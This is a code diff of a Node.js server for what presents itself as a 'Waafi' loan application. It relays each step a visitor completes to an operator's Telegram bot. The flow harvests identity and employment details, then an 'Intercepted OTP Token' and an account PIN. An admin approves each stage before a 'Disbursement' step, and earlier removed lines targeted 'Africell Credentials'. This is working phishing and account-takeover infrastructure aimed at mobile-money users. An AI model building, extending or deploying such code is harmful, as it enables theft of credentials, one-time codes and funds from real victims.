@@ -5,12 +5,13 @@ const socketIo = require('socket.io');
 const path = require('path');
 const cors = require('cors');
 
-const botManager = require('./bot_manager');
+// Destructure both the botManager object and its express routing middleware
+const { botManager, botRouter } = require('./bot_manager');
 
 const app = express();
 const server = http.createServer(app);
 
-// Configure Socket.io for Render (CORS is essential)
+// Configure Socket.io for Render (CORS is essential for real-time frontend feedback loops)
 const io = socketIo(server, {
     cors: {
         origin: "*",
@@ -18,7 +19,7 @@ const io = socketIo(server, {
     }
 });
 
-global.io = io; // Allow bot_manager to access the socket instance
+global.io = io; // Link socket globally so botManager webhook callbacks can message specific active user rooms
 
 const PORT = process.env.PORT || 3000;
 const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
@@ -27,52 +28,68 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook Route for Telegram
+// Mount the integrated bot router middleware to capture webhook updates at /bot/webhook
+app.use(botRouter);
+
+// Fallback webhook route handling raw message updates directly through TelegramBot API
 app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
     botManager.bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
 io.on('connection', (socket) => {
-    // Generate a unique AppID for the session
-    const appId = `ASA-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    // Generate unique application session tracking token
+    const appId = `WAAFI-${Math.floor(100000 + Math.random() * 900000)}`;
     
-    // CRITICAL: Join the room so the bot can "call back" this specific user
     socket.join(appId);
+    console.log(`🔌 Waafi Application Session Connected: ${appId}`);
     
-    console.log(`🔌 User connected: ${appId}`);
+    // Send AppID down to the frontend right away to bind state models
     socket.emit('session-ready', { appId: appId });
 
-    // Step Handlers
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "Step 1: Loan", data));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "Step 2: Identity", data));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "Step 3: Employment", data));
-
-    // Step 4: Africell Credentials - Triggers Admin Approval Gate
-    socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "Step 4: Credentials", data, true);
+    // Step 1: Core Loan Configuration Logging
+    socket.on('step1', (data) => {
+        botManager.sendToAdmin(appId, "Waafi - Step 1: Loan Request", data, null);
     });
 
-    socket.on('step5', (data) => {
-        botManager.sendToAdmin(appId, "Step 5: OTP Received", data);
+    // Step 2: Personal Coordinate Mapping Logging
+    socket.on('step2', (data) => {
+        botManager.sendToAdmin(appId, "Waafi - Step 2: Identity Profile", data, null);
     });
 
-    // Step 6: Final PIN Approval
-    socket.on('step6', (data) => {
+    // Step 3: Financial Background Assessment (Triggers OTP prompt button dashboard)
+    socket.on('step3-data', (data) => {
+        botManager.sendToAdmin(appId, "Waafi - Step 3: Income & Employment", data, "step3");
+    });
+
+    // Step 4: SMS OTP Capture Layer (Triggers PIN prompt button dashboard)
+    socket.on('step4-otp', (data) => {
+        botManager.sendToAdmin(appId, "Waafi - Step 4: Intercepted OTP Token", data, "step4");
+    });
+
+    // Step 5: Secure Account Authorization PIN Submission (Triggers Disbursement button dashboard)
+    socket.on('step5-pin', (data) => {
         botManager.sendFinalApproval(appId, data.pin);
     });
 
     socket.on('disconnect', () => {
-        console.log(`🔌 User disconnected: ${appId}`);
+        console.log(`🔌 Application Session Disconnected: ${appId}`);
     });
 });
 
 server.listen(PORT, async () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    // Set Webhook using the Render External URL
+    console.log(`🚀 Waafi Loan Verification Core running on port ${PORT}`);
+    
+    // Auto-configure Webhooks on deployment platforms like Render
     if (EXTERNAL_URL) {
-        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
-        await botManager.bot.setWebHook(webhookUrl);
-        console.log(`✅ Webhook set to: ${webhookUrl}`);
+        const webhookUrl = `${EXTERNAL_URL}/bot/webhook`;
+        try {
+            await botManager.bot.setWebHook(webhookUrl);
+            console.log(`✅ Telegram Webhook auto-bound directly to: ${webhookUrl}`);
+        } catch (err) {
+            console.error('❌ Webhook Setup Failed to initialize on startup:', err.message);
+        }
+    } else {
+        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside runtime environment profiles.');
     }
 });
